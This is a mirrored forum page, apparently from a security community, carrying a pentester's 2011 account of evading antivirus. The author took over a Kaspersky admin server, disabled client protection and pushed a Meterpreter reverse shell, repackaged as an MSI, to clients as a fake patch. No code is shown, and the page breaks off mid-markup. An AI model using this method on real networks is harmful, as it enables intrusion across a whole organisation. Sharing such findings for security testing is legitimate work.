@@ -1,0 +1,1380 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=708&p=7009 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:11:57 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta id="e_vb_meta_bburl" name="vb_meta_bburl" content="index.html" />
+<base  /><!--[if IE]></base><![endif]-->
+<meta name="generator" content="vBulletin 4.2.1" />
+<meta http-equiv="X-UA-Compatible" content="IE=9" />
+
+	<link rel="Shortcut Icon" href="favicon.ico" type="image/x-icon" />
+
+
+
+
+
+
+	<meta property="fb:app_id" content="170793809601191" />
+<meta property="og:site_name" content="Garage4hackers Forum" />
+<meta property="og:description" content="Garage4Hackers(G4H) is an open security community for Information Security enthusiasts, gurus and aspirants.Members of the team dedicate time and resources towards helping other information security aspirants, sharing knowledge,spreading security awareness and promoting research." />
+<meta property="og:url" content="showthread5d44.html?t=708" />
+<meta property="og:type" content="article" />
+
+
+
+
+	
+		<script type="text/javascript" src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js"></script>
+	
+
+<script type="text/javascript">
+<!--
+	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
+	{
+		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
+		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
+		var yuipath = 'clientscript/yui';
+		var yuicombopath = '';
+		var remoteyui = false;
+	}
+	else	// Load Rest of YUI remotely (where possible)
+	{
+		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var remoteyui = true;
+		if (!yuicombopath)
+		{
+			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
+		}
+	}
+	var SESSIONURL = "";
+	var SECURITYTOKEN = "guest";
+	var IMGDIR_MISC = "images/misc";
+	var IMGDIR_BUTTON = "images/buttons";
+	var vb_disable_ajax = parseInt("0", 10);
+	var SIMPLEVERSION = "421";
+	var BBURL = "index.html";
+	var LOGGEDIN = 0 > 0 ? true : false;
+	var THIS_SCRIPT = "showthread";
+	var RELPATH = "showthread3f02.html?t=708&amp;p=7009";
+	var PATHS = {
+		forum : "",
+		cms   : "",
+		blog  : ""
+	};
+	var AJAXBASEURL = "index.html";
+// -->
+</script>
+<script type="text/javascript" src="clientscript/vbulletin-core6719.js?v=421"></script>
+
+
+
+	<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum RSS Feed" href="external9476.php?type=RSS2" />
+	
+		<link rel="alternate" type="application/rss+xml" title="Garage4hackers Forum - Exploitation Techniques - RSS Feed" href="externalb77f.php?type=RSS2&amp;forumids=22" />
+	
+
+
+
+	<link rel="stylesheet" type="text/css" href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," />
+
+	<!--[if lt IE 8]>
+	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
+	<![endif]-->
+
+
+	<meta name="keywords" content="antivirus evasion, firewall evasion, push, shell, code, address, download, call, firewall, payload, file, entry, deploy, base, make, find_function, [edx, fb1h2s, [esp, path, execute, find, [ebp, null, form, coded, hard, [ebx, webroot, holds, test, function, exitprocess, titledownload, byte, http://127.0.0.184/a.bak, date, 0x1c], _start, tested, author, [18/1/2011], drops, suggestions, works, find_function_finished, place, server, find_function_loop, compute_hash_again" />
+	<meta name="description" content="# Date:  
+# Paper Title: Antivirus/ Firewall Evasion Techniques: Evolution of Download Deploy Shellcode 
+# Date:  
+# Author:  
+# htpp://Garage4Hackers.com http://fb1h2s.com 
+#All greets to Garage Hackers Members.  
+# I love to start with greets :D 
+# and to NUll and Andhrahackers people 
+#Special thanks to w3bd3vil(null), rohith, ricks2600, prashant(null) 
+#" />
+
+	<title> Antivirus/ Firewall Evasion Techniques: Evolution of Download Deploy Shellcode</title>
+	<link rel="canonical" href="showthread5d44.html?t=708" />
+	
+	<script type="text/javascript" src="clientscript/vbulletin_textedit6719.html?v=421"></script>
+	<script type="text/javascript" src="clientscript/vbulletin_post_loader6719.html?v=421"></script>
+	
+	
+	
+	
+	
+	
+
+	
+		<link rel="stylesheet" type="text/css" href="css8d9b.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=postlist.css,showthread.css,postbit.css,attachment.css,poll.css,lightbox.css" />
+	
+
+<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+
+</head>
+
+<body>
+
+<div class="above_body"> <!-- closing tag is in template navbar -->
+<div id="header" class="floatcontainer doc_header">
+	<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+	<div id="toplinks" class="toplinks">
+		
+			<ul class="nouser">
+			
+				<li><a href="register.html" rel="nofollow">Register</a></li>
+			
+				<li><a rel="help" href="faq.html">Help</a></li>
+				<li>
+			<script type="text/javascript" src="clientscript/vbulletin_md56719.html?v=421"></script>
+			<form id="navbar_loginform" action="../external.html?link=http://garage4hackers.com/login.php?do=login" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
+				<fieldset id="logindetails" class="logindetails">
+					<div>
+						<div>
+					<input type="text" class="textbox default-value" name="vb_login_username" id="navbar_username" size="10" accesskey="u" tabindex="101" value="User Name" />
+					<input type="password" class="textbox" tabindex="102" name="vb_login_password" id="navbar_password" size="10" />
+					<input type="text" class="textbox default-value" tabindex="102" name="vb_login_password_hint" id="navbar_password_hint" size="10" value="Password" style="display:none;" />
+					<input type="submit" class="loginbutton" tabindex="104" value="Log in" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." accesskey="s" />
+						</div>
+					</div>
+				</fieldset>
+				<div id="remember" class="remember">
+					<label for="cb_cookieuser_navbar"><input type="checkbox" name="cookieuser" value="1" id="cb_cookieuser_navbar" class="cb_cookieuser_navbar" accesskey="c" tabindex="103" /> Remember Me?</label>
+				</div>
+
+				<input type="hidden" name="s" value="" />
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="login" />
+				<input type="hidden" name="vb_login_md5password" />
+				<input type="hidden" name="vb_login_md5password_utf" />
+			</form>
+			<script type="text/javascript">
+			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+			vB_XHTML_Ready.subscribe(function()
+			{
+			//
+				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
+				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
+				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
+				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
+			});
+			
+			function navbar_username_focus(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == 'User Name')
+				{
+				//
+					textbox.value='';
+					textbox.style.color='#000000';
+				}
+			}
+
+			function navbar_username_blur(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				if (textbox.value == '')
+				{
+				//
+					textbox.value='User Name';
+					textbox.style.color='#777777';
+				}
+			}
+			
+			function navbar_password_hint(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
+				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
+				YAHOO.util.Dom.get('navbar_password').focus();
+			}
+
+			function navbar_password(e)
+			{
+			//
+				var textbox = YAHOO.util.Event.getTarget(e);
+				
+				if (textbox.value == '')
+				{
+					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
+					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
+				}
+			}
+			</script>
+				</li>
+				
+					<li id="fb_headerbox" class="hidden">
+
+	<a id="fb_loginbtn" href="#"><img src="images/misc/facebook_login.html" alt="The Facebook Platform" /></a>
+
+</li>
+
+				
+			</ul>
+		
+	</div>
+	<div class="ad_global_header">
+		 
+		 
+	</div>
+	<hr />
+</div>
+<div id="navbar" class="navbar">
+	<ul id="navtabs" class="navtabs floatcontainer">
+		
+		
+	
+		<li  id="vbtab_whatsnew">
+			<a class="navtab" href="activity.html">What's New?</a>
+		</li>
+		
+		
+
+	
+		<li  id="vbtab_cms">
+			<a class="navtab" href="content.html">Articles</a>
+		</li>
+		
+		
+
+	
+		<li class="selected" id="vbtab_forum">
+			<a class="navtab" href="forum.html">Forum</a>
+		</li>
+		
+		
+			<ul class="floatcontainer">
+				
+					
+						
+							<li id="vbflink_newposts"><a href="search8427.html?do=getnew&amp;contenttype=vBForum_Post">New Posts</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_faq"><a href="faq.html">FAQ</a></li>
+						
+					
+				
+					
+						
+							<li id="vbflink_calendar"><a href="calendar.html">Calendar</a></li>
+						
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_community">
+							<a href="javascript://" class="popupctrl">Community</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbclink_members"><a href="memberlist.html">Member List</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_actions">
+							<a href="javascript://" class="popupctrl">Forum Actions</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbalink_mfr"><a href="forum.html?do=markread&amp;markreadhash=guest">Mark Forums Read</a></li>
+								
+							</ul>
+						</li>
+					
+				
+					
+						<li class="popupmenu" id="vbmenu_qlinks">
+							<a href="javascript://" class="popupctrl">Quick Links</a>
+							<ul class="popupbody popuphover">
+								
+									<li id="vbqlink_posts"><a href="search2791.html?do=getdaily&amp;contenttype=vBForum_Post">Today's Posts</a></li>
+								
+									<li id="vbqlink_leaders"><a href="showgroups.html">View Site Leaders</a></li>
+								
+							</ul>
+						</li>
+					
+				
+			</ul>
+		
+
+	
+		<li  id="vbtab_blog">
+			<a class="navtab" href="blog.html">Blogs</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nja4_357">
+			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_579">
+			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
+		</li>
+		
+		
+
+	
+		<li  id="tab_nta0_442">
+			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
+		</li>
+		
+		
+
+		<li>
+            <a class="navtab" href="pages.html">Events and Conferences</a></li>
+	</ul>
+	
+		<div id="globalsearch" class="globalsearch">
+			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" method="post" id="navbar_search" class="navbar_search">
+				
+				<input type="hidden" name="securitytoken" value="guest" />
+				<input type="hidden" name="do" value="process" />
+				<span class="textboxcontainer"><span><input type="text" value="" name="query" class="textbox" tabindex="99"/></span></span>
+				<span class="buttoncontainer"><span><input type="image" class="searchbutton" src="images/buttons/search.html" name="submit" onclick="document.getElementById('navbar_search').submit;" tabindex="100"/></span></span>
+			</form>
+			<ul class="navbar_advanced_search">
+				<li><a href="search.html" accesskey="4">Advanced Search</a></li>
+				
+			</ul>
+		</div>
+	
+</div>
+</div><!-- closing div for above_body -->
+
+<div class="body_wrapper">
+<div id="breadcrumb" class="breadcrumb">
+	<ul class="floatcontainer">
+		<li class="navbithome"><a href="content.html" accesskey="1"><img src="images/misc/navbit-home.html" alt="Home" /></a></li>
+		
+	<li class="navbit"><a href="forum.html">Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplayffeb.html?f=20">Experts Forum</a></li>
+
+	<li class="navbit"><a href="forumdisplay8941.html?f=22">Exploitation Techniques</a></li>
+
+		
+	<li class="navbit lastnavbit"><span> Antivirus/ Firewall Evasion Techniques: Evolution of Download Deploy Shellcode</span></li>
+
+	</ul>
+	<hr />
+</div>
+
+
+<div style="width:728px; margin:0 auto; padding-bottom:1em">
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-6847984837250662";
+google_ad_host = "ca-host-pub-2606800903002383";
+google_ad_width = 728;
+google_ad_height = 15;
+google_ad_format = "728x15_0ads_al_s";
+google_ad_channel = "";
+google_color_border = "";
+google_color_bg = "";
+google_color_link = "";
+google_color_text = "";
+google_color_url = "";
+google_ui_features = "rc:6";
+//-->
+</script>
+<script type="text/javascript"
+  src="../pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+</div>
+
+<div id="ad_global_below_navbar"><script async src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<!-- garage1 -->
+<ins class="adsbygoogle"
+     style="display:inline-block;width:728px;height:90px"
+     data-ad-client="ca-pub-6847984837250662"
+     data-ad-slot="4036513682"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+
+	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" method="post" id="notices" class="notices">
+		<input type="hidden" name="do" value="dismissnotice" />
+		<input type="hidden" name="s" value="" />
+		<input type="hidden" name="securitytoken" value="guest" />
+		<input type="hidden" id="dismiss_notice_hidden" name="dismiss_noticeid" value="" />
+		<input type="hidden" name="url" value="" />
+		<ol>
+			<li class="restore" id="navbar_notice_2">
+	
+	<html>
+<h2>
+The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 
+
+
+</h2>
+
+<!-- Mirrored from garage4hackers.com/showthread.php?t=708&p=7009 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:12:01 GMT -->
+</html>
+</li>
+		</ol>
+	</form>
+
+
+
+
+
+	<div id="above_postlist" class="above_postlist">
+		
+
+		<div id="pagination_top" class="pagination_top">
+		
+			<div id="postpagestats_above" class="postpagestats">
+				Results 1 to 10 of 20
+			</div>
+		</div>
+	</div>
+<div id="pagetitle" class="pagetitle">
+	<h1>
+		Thread: <span class="threadtitle"><a href="showthread5d44.html?t=708" title="Reload this Page">Antivirus/ Firewall Evasion Techniques: Evolution of Download Deploy Shellcode</a></span>
+
+<a class="a2a_dd" href="../external.html?link=http://www.addtoany.com/share_save"><img src="../static.addtoany.com/buttons/share_save_171_16.png" width="171" height="16" border="0" alt="Share/Save - My123World.Com!"/></a><script type="text/javascript">a2a_show_title=1;a2a_num_services=14;</script><script type="text/javascript" src="../static.addtoany.com/menu/page.js"></script>
+
+		
+			
+<fb:like href="showthread5d44.html?t=708" font="tahoma" layout="standard" show_faces="false" width="260" action="../external.html?link=http://garage4hackers.com/like" colorscheme="light"></fb:like>
+		
+	</h1>
+</div>
+	<div id="thread_controls" class="thread_controls">
+		<div>
+		<ul id="postlist_popups" class="postlist_popups popupgroup">
+			
+			<li class="popupmenu" id="threadtools">
+				<h6><a class="popupctrl" href="javascript://">Thread Tools</a></h6>
+				<ul class="popupbody popuphover">
+					<li><a href="printthread92a2.html?t=708&amp;pp=10&amp;page=1" accesskey="3" 
+						rel="nofollow">Show Printable Version</a></li>
+					<li><a href="sendmessagec259.html?do=sendtofriend&amp;t=708"
+						rel="nofollow">Email this Page&hellip;</a></li>
+					<li>
+						
+							<a href="subscription06cc.html?do=addsubscription&amp;t=708" 
+								rel="nofollow">Subscribe to this Thread&hellip;</a>
+											
+					</li>
+					
+				</ul>
+			</li>
+
+			
+
+			
+				<li class="popupmenu searchthread" id="searchthread">
+					<h6><a class="popupctrl" href="javascript://">Search Thread</a></h6>
+					<form action="../external.html?link=http://garage4hackers.com/search.php" method="post">
+						<ul class="popupbody popuphover">
+							<li>
+								<input type="text" name="query" class="searchbox" value="Search..." tabindex="13" />
+								<input type="submit" class="button" value="Search" tabindex="14" />
+							</li>
+							<li class="formsubmit">
+								<div><a class="advancedsearchlink" href="searchaec8.html?search_type=1&amp;searchthreadid=708&amp;contenttype=vBForum_Post">Advanced Search</a></div>
+							</li>
+						</ul>
+						<input type="hidden" name="s" value="" />
+						<input type="hidden" name="securitytoken" value="guest" />
+						<input type="hidden" name="do" value="process" />
+						<input type="hidden" name="searchthreadid" value="708" />
+						<input type="hidden" name="search_type" value="1" />
+						<input type="hidden" name="contenttype" value="vBForum_Post" />
+
+					</form>
+				</li>
+			
+
+			
+
+			
+				<li class="popupmenu" id="displaymodes">
+					<h6><a class="popupctrl" href="javascript://">Display</a></h6>
+					<ul class="popupbody popuphover">
+						<li><a href="showthread847e-2.html?t=708&amp;p=7009&amp;mode=linear#post7009"> Switch to Linear Mode</a></li>
+						<li><a href="showthread555c.html?t=708&amp;mode=hybrid"> Switch to Hybrid Mode</a></li>
+						<li><label>Threaded Mode</label></li>
+					</ul>
+				</li>
+			
+
+			
+		</ul>
+		</div>
+	</div>
+
+<div id="postlist" class="postlist restrain">
+	
+		<script type="text/javascript">
+<!--
+var imgdir_statusicon = "images/statusicon";
+var imgdir_misc = "images/misc";
+var cleargifurl = "clear.gif";
+var guestphrase = "Guest";
+var morephrase = "More replies below current depth...";
+var highlightwords = "";
+//-->
+</script>
+
+<script type="text/javascript" src="clientscript/vbulletin_thrdpostlist6719.html?v=421"></script>
+
+<script type="text/javascript">
+<!--
+// initialize some variables
+var curpostid = 7009;
+var quickreply = false;
+
+// cached posts (no page reload required to view)
+pd[2681] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2681">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">02:27 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2681" href="showthread.php?t=708&amp;p=2681&amp;viewfull=1#post2681" class="postcounter">#1</a><a id="postcount2681" name="1"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2681_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				\r\n				<div class="imlinks">\r\n					    \r\n				</div>\r\n			\r\n		</div>\r\n		<div class="postbody">\r\n			<div class="postrow has_after_content">\r\n				\r\n				\r\n				<h2 class="title icon">\r\n					Antivirus/ Firewall Evasion Techniques: Evolution of Download Deploy Shellcode\r\n				</h2>\r\n				\r\n\r\n\r\n						\r\n						\r\n				<div class="content">\r\n					<div id="post_message_2681">\r\n						<blockquote class="postcontent restore ">\r\n							[B]# Date: [18/1/2011]<br />\r\n# Paper Title: Antivirus/ Firewall Evasion Techniques: Evolution of Download Deploy Shellcode<br />\r\n# Date: [18/1/2011]<br />\r\n# Author: [FB1H2S]<br />\r\n# htpp://Garage4Hackers.com <a href="http://fb1h2s.com" target="_blank">http://fb1h2s.com</a><br />\r\n#All greets to Garage Hackers Members. <br />\r\n# I love to start with greets <img src="images/smilies/biggrin.png" border="0" alt="" title="Big Grin" class="inlineimg" /><br />\r\n# and to NUll and Andhrahackers people<br />\r\n#Special thanks to w3bd3vil(null), rohith, ricks2600, prashant(null)<br />\r\n#<br />\r\n##################################################  #########################<br />\r\n<br />\r\n<b>Overview:</b><br />\r\n<br />\r\nThe effectiveness of an Anti virus/ Firewall is highly valued to it customers and in scenarios of a PenTest. This post talks about a serious of observations and techniques tried in order to bypass AV and evaluate AV/Firewall\'s effectiveness and the development of Download Deploy payload .<br />\r\n<br />\r\n<b>What made me write this</b><br />\r\n<br />\r\nI was assigned with a PT last week which we were able to achieve 100% percent success. And the success rate were because of an Anti virus Server, ok here is the incident.<br />\r\n<br />\r\nAfter completing VA we moved on to PT, a good no of un patched windows systems were spotted so we armed msf(Metsploit) and started shooting, but exploits failed , and no metpreters or Cmd shells came back. Well all because of a stupid AV server. A Kasper-sky server was running and that was used to manage the entire network. Well payload encoding work but, certain vulnerabilities multiple exploitation is not possible so if you fail first you will lose the game, so different ideas and taught s poped in my head and this paper is an implementation of that.<br />\r\n<br />\r\nAny was we dint give up and started attacking the AV Admin server itself , and woot woot we were in. <br />\r\n&quot;<div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				<i>Am not gone mention how I got in coz u will laugh</i>\r\n			\r\n		</div>\r\n	</div>\r\n</div>&quot;,and that is not the point , the point is I was able to get an RDP to Kaspersky admin server machine. And the fun begins. <br />\r\n<br />\r\nAs it was Kasper-sky Admin server, and all the network machines were connected to it, and Admin server manages everything form updating individual computers with updates form patching the server.<br />\r\n<b>Screenshots not live: form Kaspersky website:</b><br />\r\n<img src="http://farm6.static.flickr.com/5256/5493334853_b71b3ac983_z.jpg" border="0" alt="" /><br />\r\n<br />\r\n What quickly strike me was the Push patches options which was used to update client computer with patches , quick taught !<br />\r\n<br />\r\n <div class="bbcode_container">\r\n	<div class="bbcode_quote">\r\n		<div class="quote_container">\r\n			<div class="bbcode_quote_container"></div>\r\n			\r\n				what If I make a Metpreter_reverse_tcp and push it as a patch to the client computers will it work ?? \r\n			\r\n		</div>\r\n	</div>\r\n</div><img src="http://farm6.static.flickr.com/5135/5493929504_20af4aa028_z.jpg" border="0" alt="" /><br />\r\n<br />\r\n<b>Steps</b><br />\r\n<br />\r\n[+] Made the metpreter and moved to Admin server<br />\r\n[-] Admin server dint detect the default non encoded metpreter as a virus , No idea why :O<br />\r\n[+] Shut down the remote AV client form admin server<br />\r\n[-] Kaspersky Admin kit had a feature to build an installer out of an executable <br />\r\n[+] Converted the metpreter .exe to .msi installer, seems like the AV signs the payload when this is done<br />\r\n[+] Pushed it to client <br />\r\n<br />\r\nAnd royal woot woot we had a metpreter, same way we could have shelled the entire network , took enough POCs and headed home.<br />\r\n <i>Thanks to D4rkest for his great support and ideas </i>.\r\n						</blockquote>\r\n					</div>\r\n\r\n					\r\n				</div>\r\n			</div>\r\n			\r\n			<div class="after_content">\r\n				\r\n				\r\n				\r\n				\r\n					<blockquote class="signature restore"><div class="signaturecontainer">Hacking Is a Matter of Time Knowledge and Patience</div></blockquote>\r\n				\r\n				\r\n			</div>\r\n			\r\n			<div class="cleardiv"></div>\r\n		</div>\r\n	</div>\r\n		<div class="postfoot">\r\n			<!-' + '- <div class="postfoot_container"> -' + '->\r\n			<div class="textcontrols floatcontainer">\r\n				<span class="postcontrols">\r\n					<img style="display:none" id="progress_2681" src="images/misc/progress.gif" alt="" />\r\n					\r\n					\r\n					\r\n						<a id="qrwq_2681" class="newreply" href="newreply.php?do=newreply&amp;p=2681" rel="nofollow" title="Reply With Quote"><img id="quoteimg_2681" src="clear.gif" alt="Reply With Quote" />  Reply With Quote</a> \r\n					\r\n					\r\n					\r\n				</span>\r\n				<span class="postlinking">\r\n					\r\n						\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n\r\n					\r\n					\r\n\r\n					\r\n					\r\n					\r\n					\r\n					\r\n				</span>\r\n			<!-' + '- </div> -' + '->\r\n			</div>\r\n		</div>\r\n	<hr />\r\n</li>\r\n';
+pd[2682] = '\r\n<li class="postbitlegacy postbitim postcontainer old" id="post_2682">\r\n<!-' + '- see bottom of postbit.css for .userinfo .popupmenu styles -' + '->\r\n\r\n	<div class="posthead">\r\n			<span class="postdate old">\r\n				\r\n					<span class="date">01-18-2011,&nbsp;<span class="time">02:29 AM</span></span>\r\n				\r\n			</span>\r\n			<span class="nodecontrols">\r\n				\r\n					<a name="post2682" href="showthread.php?t=708&amp;p=2682&amp;viewfull=1#post2682" class="postcounter">#2</a><a id="postcount2682" name="2"></a>\r\n				\r\n				\r\n				\r\n			</span>\r\n	</div>\r\n	<div class="postdetails">\r\n		<div class="userinfo">\r\n			<div class="username_container">\r\n			\r\n				<div class="popupmenu memberaction">\r\n	<a class="username offline popupctrl" href="member.php?u=8" title="fb1h2s is offline"><strong>fb1h2s</strong></a>\r\n	<ul class="popupbody popuphover memberaction_body">\r\n		<li class="left">\r\n			<a href="member.php?u=8" class="siteicon_profile">\r\n				View Profile\r\n			</a>\r\n		</li>\r\n		\r\n		<li class="right">\r\n			<a href="search.php?do=finduser&amp;userid=8&amp;contenttype=vBForum_Post&amp;showposts=1" class="siteicon_forum" rel="nofollow">\r\n				View Forum Posts\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="private.php?do=newpm&amp;u=8" class="siteicon_message" rel="nofollow">\r\n				Private Message\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="blog.php?u=8" class="siteicon_blog" rel="nofollow">\r\n				View Blog Entries\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="left">\r\n			<a href="http://Garage4Hackers.com" class="siteicon_homepage">\r\n				Visit Homepage\r\n			</a>\r\n		</li>\r\n		\r\n		\r\n		\r\n		<li class="right">\r\n			<a href="http://garage4hackers.com/list.php?r=author/8-fb1h2s" class="siteicon_article" rel="nofollow">\r\n				View Articles\r\n			</a>\r\n		</li>\r\n		\r\n\r\n		\r\n\r\n		\r\n		\r\n	</ul>\r\n</div>\r\n				<img class="inlineimg onlinestatus" src="images/statusicon/user-offline.png" alt="fb1h2s is offline" border="0" />\r\n\r\n			\r\n			</div>\r\n			<span class="usertitle">\r\n				Security Researcher\r\n			</span>\r\n			\r\n			\r\n			\r\n				<span class="postbit_reputation" id="repdisplay_2682_8" title="fb1h2s has a spectacular aura about">\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n						<img class="repimg" src="images/reputation/reputation_pos.png" alt="" />\r\n					\r\n				</span>\r\n			\r\n			\r\n			<a class="postuseravatar" href="member.php?u=8" title="fb1h2s is offline">\r\n				<img src="image.php?u=8&amp;dateline=1400680840" alt="fb1h2s\'s Avatar" title="fb1h2s\'s Avatar" />\r\n			</a>\r\n			 \r\n			\r\n				<hr />\r\n				<dl class="userinfo_extra">\r\n					<dt>Join Date</dt> <dd>Jul 2010</dd>\r\n					<dt>Location</dt> <dd>India</dd>\r\n					\r\n					<dt>Posts</dt> <dd>616</dd>	\r\n					<dt>Blog Entries</dt><dd><a href="blog.php?u=8">32</a></dd>\r\n				</dl>\r\n				\r\n				